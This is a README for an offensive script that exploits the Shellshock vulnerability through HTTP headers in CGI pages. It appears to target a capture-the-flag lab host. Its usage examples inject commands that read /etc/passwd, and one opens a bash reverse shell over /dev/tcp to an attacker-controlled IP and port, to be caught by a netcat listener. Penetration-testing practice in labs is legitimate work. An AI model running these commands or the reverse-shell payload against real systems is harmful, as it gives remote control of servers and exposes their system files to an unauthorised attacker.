# http-shellshock.sh

Script to test web pages for shellshock vulnerabilities in headers

Switches

-u = URL
-h = Headings (optional)  to test a specific header feild in address, select number from list: 

      1 = "Content-Type"

      2 = "Referer"

      3 = "Cookie"

-s = Script command (optional) default is /bin/uname -a, Full paths to commands are required


Examples below

        ./http-shellshock.sh -u url [-h number] [-s 'command to run']

        ./http-shellshock.sh -u http://10.10.10.56/cgi-bin/user.sh

Full paths to binaries may be required as web service user may not have loaded profile. The below command tests a url "Content-Type" and cat's the passwd file in /etc.

         ./http-shellshock.sh -u http://10.10.10.56:80/cgi-bin/user.sh -h 1 -s '/bin/cat /etc/passwd'

If the target is vulnerable we might be able to get a reverse shell using the following...
Start a reverse nc listener and run the below changing the attackers IP and port
 
        ./http-shellshock.sh -u http://10.10.10.56:80/cgi-bin/user.sh -h 1 -s '/bin/bash -i >& /dev/tcp/10.10.14.22/443 0>&1'

